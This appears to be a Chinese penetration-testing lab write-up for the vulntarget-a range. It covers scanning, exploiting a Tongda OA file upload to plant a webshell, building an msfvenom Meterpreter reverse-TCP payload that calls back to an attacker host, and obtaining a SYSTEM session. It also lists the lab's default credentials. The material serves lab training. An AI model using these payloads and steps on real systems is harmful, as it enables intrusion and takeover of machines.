<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Independent-Environment/Vulntarget/vulntarget-a/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.6.3">
<title data-rh="true">vulntarget-a | Target Machines WriteUp</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="vulntarget-a | Target Machines WriteUp"><meta data-rh="true" name="description" content="简介"><meta data-rh="true" property="og:description" content="简介"><link data-rh="true" rel="icon" href="/Target-Machines-WriteUp/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/Target-Machines-WriteUp/blog/rss.xml" title="Target Machines WriteUp RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Target-Machines-WriteUp/blog/atom.xml" title="Target Machines WriteUp Atom Feed">



<link rel="preconnect" href="https://static.cloudflareinsights.com">
<script src="https://static.cloudflareinsights.com/beacon.min.js" defer="defer" data-cf-beacon="{&quot;token&quot;:&quot;419208379f5c472a9afad0d3dc0396f9&quot;}"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/Target-Machines-WriteUp/assets/css/styles.0aeeb4a1.css">
<script src="/Target-Machines-WriteUp/assets/js/runtime~main.85db981f.js" defer="defer"></script>
<script src="/Target-Machines-WriteUp/assets/js/main.feeb578c.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Target-Machines-WriteUp/"><div class="navbar__logo"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Target Machines WriteUp</b></a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackTheBox/">HackTheBox</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Yunjing/">春秋云境</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackMyVM/">HackMyVM</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Xuanji/">玄机</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Target-Machines-WriteUp/docs/Independent-Environment/">其他靶场</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/ToolsGuide/Brute-Forcing/hydra">Tools Guide</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/blog">Blog</a><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z"><input placeholder="搜索" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/Target-Machines-WriteUp/docs/Independent-Environment/">其他靶场</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/Fengtaisec">纵横网络靶场</a><button aria-label="展开侧边栏分类 &#x27;纵横网络靶场&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/K8sLanParty">Kubernetes LAN Party </a><button aria-label="展开侧边栏分类 &#x27;Kubernetes LAN Party &#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/Target-Machines-WriteUp/docs/Independent-Environment/Puff-Pastry/">Puff-Pastry</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/Reversing_Kr">Reversing.Kr</a><button aria-label="展开侧边栏分类 &#x27;Reversing.Kr&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/Redclub">Redclub - 红日靶场</a><button aria-label="展开侧边栏分类 &#x27;Redclub - 红日靶场&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/Target-Machines-WriteUp/docs/category/Vulntarget">Vulntarget</a><button aria-label="折叠侧边栏分类 &#x27;Vulntarget&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/">vulntarget-a</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-b/">vulntarget-b</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/Target-Machines-WriteUp/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/Target-Machines-WriteUp/docs/category/Vulntarget"><span itemprop="name">Vulntarget</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">vulntarget-a</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>vulntarget-a</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="简介">简介<a href="#简介" class="hash-link" aria-label="简介的直接链接" title="简介的直接链接">​</a></h2>
<p><a href="https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ" target="_blank" rel="noopener noreferrer">vulntarget 漏洞靶场系列 (一) - 星期五实验室</a></p>
<p>靶场的网络拓扑</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241039-213939-471c9f6948d3fa48541a6f4039634af1.png" width="1054" height="417" class="img_ev3q"></p>
<p>需要在虚拟网络编辑器中，定义两个虚拟网络</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">VMnet18 Host-only: 10.0.20.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VMnet19 Host-only: 10.0.10.0/24</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>win7</code> 这台虚拟机作为入口机，默认的网卡包含一张桥接模式的虚拟网卡，可以视实际情况进行修改</p>
<p>直接导入 3 个  虚拟机即可，公众号写的是设计靶场的过程</p>
<p>建议按照 <code>win2019</code> -&gt;  <code>win2016</code>-&gt;  <code>win7</code> 的顺序进行启动虚拟机</p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p><code>win7 入口 win7</code> 这台靶机带有自动睡眠，需要注意</p></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">账号信息</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">win2019 域控 - 2019</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 账号：administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 密码：Admin@666</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">win2016 域成员 - 2016</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 账号：Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 密码：Admin@123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 账号：balsec.com\win2016</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 密码：Admin#123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">win7 入口 win7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 账号：win7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- 密码：admin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口探测">入口探测<a href="#入口探测" class="hash-link" aria-label="入口探测的直接链接" title="入口探测的直接链接">​</a></h2>
<p>直接使用 <code>fscan</code> 对靶机进行扫描</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.10:80 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.10:139 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.10:135 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.200.10:445 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] alive ports len is: 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]192.168.200.10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]win7-PC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]10.0.20.98</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]192.168.200.10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] WebTitle http://192.168.200.10     code:200 len:10065  title: 通达 OA 网络智能办公系统</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] MS17-010 192.168.200.10     (Windows 7 Professional 7601 Service Pack 1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] InfoScan http://192.168.200.10     [通达 OA]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] PocScan http://192.168.200.10 tongda-user-session-disclosure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] PocScan http://192.168.200.10 poc-yaml-tongda-oa-v11.9-api.ali.php-fileupload</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>很明显两个洞：通达 OA 的文件上传 + 永恒之蓝</p>
<p>永恒之蓝在没有安全软件的情况下可以直接杀到 system 权限，所以先尝试通达 OA 的洞</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="通达-oa-文件上传">通达 OA 文件上传<a href="#通达-oa-文件上传" class="hash-link" aria-label="通达 OA 文件上传的直接链接" title="通达 OA 文件上传的直接链接">​</a></h2>
<p>直接无脑上工具</p>
<p><a href="https://github.com/R4gd0ll/I-Wanna-Get-All" target="_blank" rel="noopener noreferrer">R4gd0ll/I-Wanna-Get-All: OA 漏洞利用工具</a></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241027-222704-208fe069ea4445bfea6fed3a4121aeb5.png" width="1924" height="1412" class="img_ev3q"></p>
<p>写入一个 webshell</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241032-223242-1da79ed8b99ddb2f72db7f279851fe14.png" width="1924" height="1412" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Url: http://192.168.200.10/R4g1730385139621.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pwd: whoami</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><a href="https://github.com/achuna33/MYExploit" target="_blank" rel="noopener noreferrer">achuna33/MYExploit: OAExploit 一款基于产品的一键扫描工具</a></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241030-223013-0dbfbc5d1ba9eb4149d599c5bb8cd77a.png" width="1504" height="1247" class="img_ev3q"></p>
<p>尝试写入的 webshell</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241033-223317-4dfdfa98325efac332eb3f0f2e4defe6.png" width="1542" height="1040" class="img_ev3q"></p>
<p>成功连接</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win7-持久化">win7 持久化<a href="#win7-持久化" class="hash-link" aria-label="win7 持久化的直接链接" title="win7 持久化的直接链接">​</a></h2>
<p>构造马子实现持久化</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.129 LPORT=3333 -f exe &gt; 192.168.200.129-3333.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 510 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of exe file: 7168 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>基于蚁剑上传至靶机</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241038-223825-89c3e8a860d19bef904cc694c087868e.png" width="1546" height="1043" class="img_ev3q"></p>
<p>执行监听</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ msfconsole -q</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using configured payload generic/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST =&gt; 0.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LPORT 3333</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPORT =&gt; 3333</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 0.0.0.0:3333</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241040-224006-0272bbc415b75ee146009f32f80a59c2.png" width="1959" height="1083" class="img_ev3q"></p>
<p>成功建立 Meterpreter 会话，并且已经是 <code>NT AUTHORITY\SYSTEM</code> 用户</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="建立内网代理">建立内网代理<a href="#建立内网代理" class="hash-link" aria-label="建立内网代理的直接链接" title="建立内网代理的直接链接">​</a></h2>
<p>使用 <code>chisel</code> 建立内网代理</p>
